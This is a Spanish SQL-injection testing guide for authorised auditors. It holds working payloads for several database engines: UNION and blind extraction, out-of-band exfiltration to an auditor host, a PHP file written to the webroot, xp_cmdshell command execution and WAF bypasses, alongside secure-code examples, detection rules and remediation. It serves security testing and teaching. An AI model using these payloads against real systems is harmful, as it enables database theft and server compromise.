# Inyección SQL (SQL Injection, SQLi)

| Clasificación | |
|---|---|
| CWE | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| OWASP Top 10:2025 | A05 — Injection |
| OWASP API Top 10:2023 | Sin categoría propia; suele reportarse junto a API8:2023 Security Misconfiguration o API10:2023 Unsafe Consumption of APIs según el origen del dato |
| WSTG | WSTG-INPV-05 (y subsecciones 05.1 Oracle, 05.2 MySQL, 05.3 SQL Server, 05.4 PostgreSQL, 05.5 MS Access, 05.6 NoSQL, 05.7 ORM, 05.8 Client-side) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación por contexto y SGBD · 5. Evasión de filtros y WAF · 6. Escalada y encadenamiento · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia mínima · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

La inyección SQL aparece cuando la aplicación construye una consulta SQL **concatenando** datos que controla el usuario, de modo que esos datos dejan de ser un simple valor y pasan a formar parte de la gramática de la consulta. El SGBD (sistema gestor de base de datos: MySQL, PostgreSQL, SQL Server, Oracle, SQLite…) no puede distinguir qué parte escribió el programador y qué parte el atacante.

Variantes según cómo se obtiene el resultado:

- **En banda (in-band):** el resultado vuelve en la propia respuesta HTTP. Incluye la basada en **errores** (el mensaje de error filtra datos) y la basada en **UNION** (se añade una segunda consulta cuyo resultado se pinta en la página).
- **Inferencial o ciega (blind):** no se ve el dato, pero se deduce bit a bit. **Booleana**: la respuesta cambia según una condición sea verdadera o falsa. **Por tiempo**: se provoca un retardo solo si la condición es verdadera.
- **Fuera de banda (OOB, out-of-band):** el SGBD hace una petición DNS o HTTP a un servidor del auditor (OAST, *Out-of-band Application Security Testing*: Burp Collaborator, interactsh) llevando el dato.
- **Consultas apiladas (stacked queries):** se cierra la sentencia con `;` y se ejecuta otra. Depende del driver (habitual en SQL Server y PostgreSQL; raro en PHP+MySQL con `mysqli_query`).
- **De segundo orden (second-order):** el dato se guarda “limpio” y se concatena más tarde en otra consulta (por ejemplo, un nombre de usuario usado después en un informe).

Causa raíz: concatenación o interpolación de cadenas en lugar de **consultas parametrizadas** (el valor viaja separado de la sentencia), o parametrización imposible en **identificadores** (nombres de columna, `ORDER BY`, nombres de tabla) sin lista blanca.

## 2. Dónde buscar (señales del reconocimiento)

- Parámetros de búsqueda, filtro, ordenación y paginación: `id`, `q`, `search`, `sort`, `order`, `dir`, `column`, `limit`, `offset`, `from`, `to`, `category`.
- Filtros “avanzados” de APIs: `filter[name]=`, `where=`, `$filter=` (OData), `query=` estilo DSL, GraphQL con argumentos `filter`/`orderBy` que el resolver traduce a SQL.
- Exportaciones (CSV, PDF, informes), paneles de administración, generadores de informes, endpoints legacy (`.asp`, `.php`, `.cfm`, `.jsp`).
- Cabeceras que se almacenan o registran: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`, `Accept-Language`, cookies de seguimiento.
- Cuerpos JSON, XML/SOAP, mensajes WebSocket, nombres de fichero subidos, campos de perfil reutilizados más tarde (segundo orden).
- Señales: error 500 al meter `'`, mensajes como `You have an error in your SQL syntax`, `unterminated quoted string`, `ORA-00933`, `Unclosed quotation mark`, `SQLITE_ERROR`, `PG::SyntaxError`; un `id=2-1` que devuelve lo mismo que `id=1`; un parámetro `sort` que acepta nombres de columna arbitrarios.

## 3. Detección segura (primeras sondas, no destructivas)

> **Regla de oro:** nunca uses `OR 1=1` a ciegas. Si el parámetro acaba en un `UPDATE` o `DELETE`, una tautología afecta a **todas las filas**. Empieza con sondas que solo cambian la sintaxis o con `AND` sobre un registro propio.

Rotura y reparación de sintaxis (si `'` rompe y `''` arregla, hay concatenación):

```text
'      ''      "      ""      `      \      ')      '))      ";
```

Contexto numérico (aritmética evaluada por el SGBD, no por la aplicación):

```text
id=2-1        id=1*1        id=(1)        id=1%2b0       id=0x1 (MySQL)
```

Concatenación de cadenas (confirma contexto de texto y da pista del SGBD):

```text
'||'          → Oracle, PostgreSQL, SQLite        valor: ab  →  a'||'b
'+'           → SQL Server                          a'+'b
' '           → MySQL (literales adyacentes)        a' 'b
'||'          → en MySQL es OR lógico salvo PIPES_AS_CONCAT
```

Pares booleanos (comparar longitud y contenido de la respuesta):

```sql
' AND '1'='1        vs   ' AND '1'='2
1 AND 1=1           vs   1 AND 1=2
' AND 1=1-- -       vs   ' AND 1=2-- -
```

Retardo controlado (usa 3–5 s, repite al menos tres veces y alterna con 0 s para descartar latencia):

```sql
-- MySQL: subconsulta para que el retardo ocurra una sola vez y no por cada fila
' AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -
-- PostgreSQL
' AND 1=(SELECT 1 FROM pg_sleep(3))--
'||(SELECT '' FROM pg_sleep(3))||'
-- SQL Server
'; WAITFOR DELAY '0:0:3'--
' IF(1=1) WAITFOR DELAY '0:0:3'--
-- Oracle (DBMS_PIPE puede requerir privilegio)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--
-- SQLite (no tiene sleep; consulta pesada controlada)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--
```

⚠️ `OR SLEEP(5)` se evalúa **por cada fila** de la tabla: con 10 000 filas son 14 horas de bloqueo de conexión. Usa siempre `AND` o la subconsulta anterior.

Políglota de tiempo para varios contextos de comillas (útil en un primer barrido manual):

```text
SLEEP(3) /*' or SLEEP(3) or '" or SLEEP(3) or "*/
```

OAST (cuando no hay diferencia visible ni de tiempo): ver §4.6.

### Identificación del SGBD

| SGBD | Versión | Retardo | Concatenación | Comentario | Pista única |
|---|---|---|---|---|---|
| MySQL/MariaDB | `@@version`, `version()` | `SLEEP(n)` | `CONCAT()`, `' '` | `-- -`, `#`, `/* */` | `connection_id()`, `/*!50000 */` |
| PostgreSQL | `version()` | `pg_sleep(n)` | `\|\|` | `--`, `/* */` | `pg_client_encoding()`, `::int` |
| SQL Server | `@@version` | `WAITFOR DELAY` | `+` | `--`, `/* */` | `@@SERVERNAME`, `DB_NAME()`, `BINARY_CHECKSUM(1)` |
| Oracle | `SELECT banner FROM v$version` | `DBMS_PIPE.RECEIVE_MESSAGE` | `\|\|` | `--` | `FROM dual` obligatorio, `ROWNUM` |
| SQLite | `sqlite_version()` | (consulta pesada) | `\|\|` | `--`, `/* */` | `sqlite_master`, `last_insert_rowid()` |

## 4. Explotación por contexto o tecnología

### 4.1 UNION (en banda)

```sql
-- 1) Número de columnas
' ORDER BY 1-- -      ' ORDER BY 5-- -      (el error marca el límite)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
-- Oracle exige FROM:  ' UNION SELECT NULL,NULL FROM dual--
-- 2) Columnas que se pintan y aceptan texto
' UNION SELECT 'c0rvus',NULL,NULL-- -
-- 3) Datos mínimos de prueba
' UNION SELECT @@version,current_user(),database()-- -          -- MySQL
' UNION SELECT version(),current_user,current_database()--       -- PostgreSQL
' UNION SELECT @@version,SYSTEM_USER,DB_NAME()--                 -- SQL Server
' UNION SELECT banner,NULL FROM v$version--                      -- Oracle
' UNION SELECT sqlite_version(),NULL--                           -- SQLite
-- 4) Esquema
' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')-- -
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT owner,table_name FROM all_tables--                -- Oracle
' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--  -- SQLite
-- 5) Varias columnas en una sola visible
' UNION SELECT CONCAT_WS(0x3a,username,email),NULL FROM users LIMIT 1-- -
' UNION SELECT string_agg(username||':'||email,','),NULL FROM users--   -- PostgreSQL
' UNION SELECT STRING_AGG(name,','),NULL FROM sys.tables--              -- SQL Server 2017+
```

Si la aplicación muestra solo la primera fila, fuerza que la consulta original no devuelva nada (`id=-1 UNION…`) o pagina con `LIMIT n,1` / `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY`.

### 4.2 Basada en errores

```sql
-- MySQL (devuelve ~32 caracteres; trocear con SUBSTRING)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)-- -
-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_user) AS numeric)--
-- SQL Server
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--
-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL--
```

### 4.3 Ciega booleana

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'-- -                       -- MySQL / SQL Server (SUBSTRING)
' AND ASCII(SUBSTRING((SELECT current_user),1,1))>77--                 -- búsqueda binaria
' AND (SELECT LENGTH(password) FROM users WHERE username='corvus_test')=60-- -
' AND SUBSTR((SELECT user FROM dual),1,1)='S'--                         -- Oracle
-- Error condicional cuando la página no cambia pero sí el código HTTP
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--                  -- PostgreSQL / SQL Server
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--   -- Oracle
' AND IF(1=1,(SELECT 1 UNION SELECT 2),1)-- -                           -- MySQL: "Subquery returns more than 1 row"
```

### 4.4 Ciega por tiempo condicional

```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(3),0)-- -                         -- MySQL
' AND 1=(SELECT CASE WHEN (SUBSTR(current_user,1,1)='p') THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)--   -- PostgreSQL
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--                         -- SQL Server
' AND 1=(CASE WHEN (SUBSTR(user,1,1)='S') THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 1 END)--  -- Oracle
```

### 4.5 Contextos especiales

```sql
-- ORDER BY / nombre de columna (no admite parámetros ⇒ muy frecuente)
sort=(CASE WHEN (1=1) THEN name ELSE price END)
sort=IF(1=1,name,price)                                       -- MySQL
sort=(CASE WHEN (SELECT 1)=1 THEN 1 ELSE 1/(SELECT 0) END)    -- PostgreSQL: error solo si falso
sort=name ASC, (SELECT 1 FROM (SELECT SLEEP(3))x)             -- MySQL tiempo
sort=1;SELECT pg_sleep(3)--                                   -- apilada en PostgreSQL

-- LIMIT en MySQL 5.0–5.6
LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)

-- INSERT (el valor va dentro de VALUES): extraer al propio registro
nombre=x'||(SELECT version())||'                               -- PostgreSQL/Oracle/SQLite
nombre=x' AND UPDATEXML(1,CONCAT(0x7e,version()),1) AND '1     -- MySQL por error

-- LIKE: los comodines % y _ no son inyección, pero confirman concatenación si ' rompe
q=a%' AND '1'='1

-- Operadores JSON (útiles además para evadir WAF)
' AND JSON_EXTRACT('{"a":1}','$.a')=1-- -                      -- MySQL
' AND '{"a":1}'::jsonb @> '{"a":1}'::jsonb--                    -- PostgreSQL
' AND JSON_VALUE('{"a":1}','$.a')='1'--                         -- SQL Server 2016+
```

⚠️ **UPDATE/DELETE:** inyectar en el `SET` o `WHERE` de una actualización puede modificar o borrar datos (`', role='admin`, `' OR '1'='1`). Solo pruebas de tiempo o error sobre el registro propio; cualquier modificación **requiere confirmación explícita del cliente**.

**Driver Node `mysql`/`mysql2` con objetos:** si el cuerpo JSON llega tal cual a un placeholder `?`, un objeto se expande como `clave = valor`:

```json
{"username":"admin","password":{"password":1}}
```

genera `password = \`password\` = 1`, que es verdadero → bypass de login. Se corrige con `stringifyObjects: true` o validando tipos.

**Segundo orden:** registra un usuario como `corvus'-- -` o `corvus' AND SLEEP(3)-- -`, después usa las funciones que reutilizan ese dato (cambio de contraseña, informes, exportaciones) y observa errores o retardos ahí.

**GraphQL / WebSocket:** las mismas sondas dentro del valor del argumento.

```json
{"query":"{ users(filter:\"x' AND 1=CAST((SELECT version()) AS int)--\"){ id } }"}
```

### 4.6 Fuera de banda (OAST)

Sustituye `OAST` por tu subdominio de Collaborator/interactsh. Prioriza enviar datos inocuos (versión, usuario de BD).

```sql
-- SQL Server (xp_dirtree resuelve una ruta UNC)
'; DECLARE @q varchar(1024); SET @q='\\'+DB_NAME()+'.OAST\a'; EXEC master..xp_dirtree @q;--
-- Oracle (XXE dentro de EXTRACTVALUE; funciona sin privilegios en versiones no parcheadas)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://'||(SELECT user FROM dual)||'.OAST/"> %x;]>'),'/l') FROM dual--
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.OAST') FROM dual--
-- MySQL en Windows (requiere privilegio FILE y secure_file_priv vacío)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.OAST\\a'))-- -
-- PostgreSQL con extensión dblink
' UNION SELECT dblink_connect('host='||current_user||'.OAST user=a password=b dbname=c')--
```

⚠️ `xp_dirtree` contra un host del auditor hace que la cuenta de servicio de SQL Server intente autenticarse por SMB y entregue un hash NetNTLMv2. Capturarlo es un ataque a credenciales: **requiere confirmación explícita del cliente**. Para OAST basta con DNS.

### 4.7 Lectura/escritura de ficheros y ejecución (solo con autorización)

```sql
-- Lectura (inocua si el fichero lo es)
' UNION SELECT LOAD_FILE('/etc/hostname'),NULL-- -                  -- MySQL, FILE + secure_file_priv
' UNION SELECT pg_read_file('/etc/hostname'),NULL--                 -- PostgreSQL superusuario o pg_read_server_files
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB) x--   -- SQL Server
```

⚠️ Lo siguiente escribe ficheros, cambia configuración o ejecuta comandos: **requiere confirmación explícita del cliente**, usa comandos inocuos (`id`, `whoami`) y deja constancia de cómo revertir.

```sql
-- MySQL: escribir en el webroot
' UNION SELECT '<?php echo 1337*7; ?>',NULL INTO OUTFILE '/var/www/html/c0rvus.php'-- -
-- PostgreSQL ≥ 9.3 (superusuario o pg_execute_server_program)
'; CREATE TEMP TABLE c0(o text); COPY c0 FROM PROGRAM 'id'; SELECT o FROM c0;--
-- SQL Server: activar xp_cmdshell cambia la configuración del servidor (revertir después)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
-- Oracle con Java habilitado: DBMS_JAVA / procedimientos Java (muy dependiente de privilegios)
```

## 5. Evasión de filtros y WAF

Ver también `vulns/waf-bypass.md`.

```sql
-- Espacios
UNION/**/SELECT     UNION%09SELECT     UNION%0aSELECT     UNION%0cSELECT     UNION(SELECT(1),(2))
'OR(1)=(1)-- -                          -- sin espacios
-- Mayúsculas y comentarios versionados (MySQL)
UnIoN SeLeCt        /*!50000UNION*/ /*!50000SELECT*/        UN/**/ION SEL/**/ECT
-- Cadenas sin comillas
0x61646d696e                         -- MySQL hex de 'admin'
CHAR(97,100,109,105,110)             -- MySQL / SQL Server
CHR(97)||CHR(100)                    -- PostgreSQL / Oracle
$$admin$$                            -- PostgreSQL dollar quoting
-- Sin signo igual
LIKE 'a'    IN ('a')    BETWEEN 'a' AND 'a'    REGEXP '^a'    NOT (x<>'a')    STRCMP(x,'a')=0
-- Sin comas
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
SUBSTRING(x FROM 1 FOR 1)      LIMIT 1 OFFSET 0      MID(x FROM 1 FOR 1)
-- Sin information_schema (MySQL)
sys.schema_table_statistics     mysql.innodb_table_stats     sys.x$schema_flattened_keys
-- Sintaxis JSON (muchos WAF no la modelaban, investigación Team82 2022)
' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -
' OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb--
```

Capas de transporte y parseo:

- Escapes JSON: `\u0027` en lugar de `'` dentro de un cuerpo JSON; entidades XML (`&#x27;`) dentro de SOAP; el WAF ve texto inocuo y el backend lo decodifica.
- Cambio de `Content-Type` (urlencoded ↔ JSON ↔ multipart), parámetros duplicados (HPP, ver `vulns/parameter-pollution.md`), doble codificación URL solo si hay doble decodificación real.
- Normalización Unicode: si el backend aplica NFKC, `＇` (U+FF07) se convierte en `'`.
- Peticiones grandes: algunos WAF solo inspeccionan los primeros N KB del cuerpo; rellenar con un parámetro inocuo largo.
- `sqlmap --tamper=space2comment,between,charencode,randomcase` (combinar con criterio, no a ciegas).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. **Contexto:** `current_user`, privilegios (`SELECT is_srvrolemember('sysadmin')`, `SELECT rolsuper FROM pg_roles WHERE rolname=current_user`, `SELECT grantee,privilege_type FROM information_schema.user_privileges`), número de bases de datos y tablas.
2. **Alcance de datos sin volcarlos:** `SELECT COUNT(*) FROM users`, nombres de columnas sensibles (`password_hash`, `iban`, `token`) y **un único registro** de la cuenta de prueba del auditor. No descargues datos personales de terceros.
3. **Bypass de autenticación:** `admin'-- -`, `' OR '1'='1'-- -` solo en formularios de login (SELECT), nunca en flujos que escriben.
4. **Pivotes:** SSRF desde la BD (`UTL_HTTP`, `dblink`, `OPENROWSET`, servidores enlazados en SQL Server `EXEC('SELECT @@version') AT [LINKED]`), lectura de configuración con secretos, hashes de la aplicación (mostrar formato, no crackear sin permiso).
5. **Encadenar:** SQLi en un campo que luego se pinta → XSS almacenado; SQLi que modifica el rol del usuario de prueba (⚠️ requiere confirmación explícita del cliente) → escalada de privilegios.
6. **RCE:** solo si el alcance lo permite y con comando inocuo (§4.7). En la nube gestionada (RDS, Cloud SQL, Azure SQL) normalmente no hay superusuario ni `xp_cmdshell`; documenta el límite en lugar de forzarlo.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Fuentes:** parámetros HTTP, cabeceras, cookies, cuerpos JSON/XML, colas de mensajes, datos leídos de la propia BD (segundo orden). **Sumideros:** cualquier API que reciba SQL como cadena.

**PHP**
```php
// Vulnerable
$r = $mysqli->query("SELECT * FROM users WHERE id = " . $_GET['id']);
DB::select("SELECT * FROM posts WHERE slug = '$slug'");               // Laravel
User::whereRaw("email = '$email'")->get();  ->orderByRaw($request->sort)
// Seguro
$st = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $st->execute([$id]);
User::where('email', $email)->get();   whereRaw('email = ?', [$email])
```
Nota: con `PDO::ATTR_EMULATE_PREPARES` activado (por defecto en pdo_mysql) se ha demostrado inyección cuando el atacante controla un identificador entrecomillado con backticks que contiene `?` y bytes nulos (investigación de 2024). Desactiva la emulación y nunca interpoles identificadores.

**Java / Spring**
```java
// Vulnerable
stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");
em.createQuery("FROM User WHERE name = '" + name + "'");                // JPQL/HQL
jdbcTemplate.query("SELECT * FROM t ORDER BY " + sort, mapper);
// MyBatis: ${} interpola, #{} parametriza
<select id="find">SELECT * FROM users WHERE name = '${name}'</select>
// Seguro
PreparedStatement ps = c.prepareStatement("SELECT * FROM users WHERE name = ?"); ps.setString(1, name);
em.createQuery("FROM User WHERE name = :n").setParameter("n", name);
<select id="find">SELECT * FROM users WHERE name = #{name}</select>
```

**Python / Django / Flask**
```python
# Vulnerable
cur.execute(f"SELECT * FROM users WHERE name = '{name}'")
cur.execute("SELECT * FROM users WHERE name = '%s'" % name)
User.objects.raw("SELECT * FROM auth_user WHERE username = '%s'" % u)
User.objects.extra(where=[f"name = '{n}'"]);  RawSQL(f"...{x}...", [])
db.session.execute(text(f"SELECT * FROM t WHERE id = {id}"))          # SQLAlchemy
User.objects.filter(**request.GET.dict())   # claves controladas: ver nosqli.md (ORM Leak) y CVE de alias en Django 2022–2024
# Seguro
cur.execute("SELECT * FROM users WHERE name = %s", (name,))
User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [u])
db.session.execute(text("SELECT * FROM t WHERE id = :id"), {"id": id})
```

**Node / Express**
```js
// Vulnerable
db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
sequelize.query("SELECT * FROM users WHERE name = '" + name + "'");
sequelize.literal(`name = '${name}'`);   knex.raw(`... ${x}`);
prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${id}`);
// Seguro
db.query('SELECT * FROM users WHERE id = ?', [id]);   // y stringifyObjects: true en mysql/mysql2
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name } });
knex('users').whereRaw('name = ?', [name]);
prisma.$queryRaw`SELECT * FROM users WHERE id = ${id}`;   // plantilla etiquetada = parametrizada
```

**.NET**
```csharp
// Vulnerable
new SqlCommand("SELECT * FROM Users WHERE Name = '" + name + "'", conn);
ctx.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'");   // cadena ya interpolada
// Seguro
cmd.CommandText = "SELECT * FROM Users WHERE Name = @n"; cmd.Parameters.AddWithValue("@n", name);
ctx.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {name}");  // o FromSql en EF Core 7+
```

**Go**
```go
// Vulnerable
db.Query(fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name))
gormDB.Where("name = '" + name + "'").Find(&u);   gormDB.Order(r.URL.Query().Get("sort"))
// Seguro
db.Query("SELECT * FROM users WHERE name = $1", name)
gormDB.Where("name = ?", name).Find(&u)
```

**Ruby / Rails**
```ruby
# Vulnerable
User.where("name = '#{params[:name]}'");  User.order(params[:sort]);  User.find_by_sql("... #{x}")
User.pluck(params[:col]);  User.group(params[:g])
# Seguro
User.where(name: params[:name]);  User.where("name = ?", params[:name])
User.order(ALLOWED_SORT.include?(params[:sort]) ? params[:sort] : "created_at")
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 '(execute|query|exec|raw|whereRaw|orderByRaw|FromSqlRaw|createQuery|createNativeQuery|queryRawUnsafe|executeRawUnsafe)\s*\(\s*(f["\x27]|`[^`]*\$\{|["\x27][^"\x27]*["\x27]\s*(\+|\.|%))' 
rg -n --pcre2 '(SELECT|INSERT|UPDATE|DELETE)\b[^;\n]*["\x27`]\s*(\+|\.)\s*\$?\w+' -i
rg -n '\$\{[^}]+\}' --glob '*Mapper.xml'                     # MyBatis ${}
rg -n 'ORDER BY .*(\+|\$\{|%s|#\{)' -i
rg -n '\.extra\(|RawSQL\(|\.raw\(' --type py
semgrep --config p/sql-injection --config p/owasp-top-ten .
```

Regla semgrep mínima para Python:

```yaml
rules:
- id: corvus-sqli-fstring
  languages: [python]
  severity: ERROR
  message: SQL construido con f-string o formato
  patterns:
    - pattern-either:
      - pattern: $C.execute(f"...", ...)
      - pattern: $C.execute("..." % $X, ...)
      - pattern: $C.execute("..." + $X, ...)
      - pattern: $C.execute("...".format(...), ...)
```

## 8. Falsos positivos frecuentes

- Un 500 al meter `'` que en realidad es validación de entrada, error de parseo JSON o WAF; comprueba que `''` lo repara.
- `id=2-1` igual a `id=1` porque la aplicación hace `intval()` o el framework convierte el tipo (evaluación en la aplicación, no en el SGBD).
- Retardos por latencia, colas o rate limiting: exige correlación lineal (3 s → +3 s, 6 s → +6 s) y repetición.
- Diferencias booleanas causadas por caché, tokens anti-CSRF o contenido dinámico; compara solo la parte estable.
- Búsquedas `LIKE` donde `%` y `_` cambian resultados: es comportamiento normal, no inyección.
- Mensajes de error SQL de **otra** petición (logs mostrados en un panel) sin relación con tu entrada.
- Escáneres que marcan “SQLi” por reflejo de la cadena `SQL syntax` presente en documentación o en la propia página.

## 9. Evidencia mínima para validarlo

- Petición y respuesta completas del par verdadero/falso **o** tres mediciones de tiempo (0 s, 3 s, 6 s) **o** la interacción OAST con marca única.
- Un dato inocuo extraído del SGBD: `version()`, `current_user`, `database()`. Si hay que demostrar acceso a datos, el recuento de filas y un registro de la cuenta de prueba.
- SGBD identificado, parámetro y contexto (cadena, número, ORDER BY…), privilegios del usuario de BD.
- Comando `curl` reproducible con cookies/tokens redactados.
- Nada de volcados de PII en el informe; si se ha visto por accidente, indícalo y no lo copies.

## 10. Severidad orientativa

| Impacto demostrado | CVSS 3.1 | CVSS 4.0 (calcular siempre con la calculadora de FIRST) |
|---|---|---|
| Sin autenticación, lectura y escritura completas de la BD | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈9.3) |
| Sin autenticación, solo lectura (ciega/UNION en SELECT) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` (≈8.7) |
| Usuario autenticado de bajo privilegio, lectura/escritura | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈8.7) |
| RCE en el servidor de BD con impacto en otros sistemas | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0) | `…/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Solo panel de administrador, datos poco sensibles | `AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N` (3.8) | `…/PR:H/…/VC:L/VI:L/VA:N/…` |

## 11. Remediación

1. Consultas parametrizadas o procedimientos almacenados sin SQL dinámico interno, en **todas** las consultas.
2. Identificadores (columnas, orden, tablas) siempre desde **lista blanca** en el servidor.
3. ORM sin APIs “raw” con interpolación; revisar `literal`, `raw`, `extra`, `whereRaw`, `FromSqlRaw`, `${}` de MyBatis.
4. Mínimo privilegio en la cuenta de BD: sin `FILE`, sin superusuario, sin `xp_cmdshell`, esquemas separados.
5. Errores genéricos al cliente; detalle solo en logs.
6. Validación de tipos (un `id` es entero; un objeto JSON no es una cadena).

```python
SORTABLE = {"name": "name", "price": "price", "date": "created_at"}
col = SORTABLE.get(request.args.get("sort"), "created_at")
direction = "DESC" if request.args.get("dir") == "desc" else "ASC"
cur.execute(f"SELECT id, name FROM products WHERE category = %s ORDER BY {col} {direction}", (cat,))
```

## 12. Herramientas

Automatización **solo después** de confirmar manualmente, con `--delay`/`--threads` bajos y sin opciones destructivas.

```bash
# Desde una petición guardada en Burp, apuntando al parámetro confirmado
sqlmap -r req.txt -p id --batch --level 3 --risk 1 --dbms PostgreSQL --technique BT --banner --current-user --current-db --is-dba
# --risk 3 añade OR-based y heavy queries: evitar salvo autorización (pueden tocar UPDATE/DELETE)
# Segundo orden
sqlmap -r req.txt -p username --second-url "https://objetivo/profile" --batch
# Ajustes de detección
sqlmap -r req.txt --string "Bienvenido" --prefix "')" --suffix "-- -" --time-sec 3 --tamper space2comment
# Ghauri: rápido en ciegas por tiempo
ghauri -r req.txt -p id --dbms mysql --batch --current-user
```

- **Burp Suite** (Repeater, Intruder con listas de PayloadsAllTheThings, Scanner como apoyo, extensión *SQLiPy*).
- **Interactsh / Burp Collaborator** para OOB.
- **semgrep**, **CodeQL** (`codeql database analyze … java-security-extended.qls`) en caja blanca.

## 13. Referencias

- OWASP WSTG — Testing for SQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — SQL injection y SQLi cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- PayloadsAllTheThings — SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- HackTricks — SQL Injection: https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- Team82 (Claroty), JSON-based SQL injection WAF bypass (2022).
- Flatt Security, “Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql” (2022).
- sqlmap: https://github.com/sqlmapproject/sqlmap/wiki/Usage · Ghauri: https://github.com/r0oth3x49/ghauri
- Relacionados: `vulns/nosqli.md`, `vulns/waf-bypass.md`, `vulns/parameter-pollution.md`, `vulns/graphql.md`, `vulns/access-control-idor.md`.
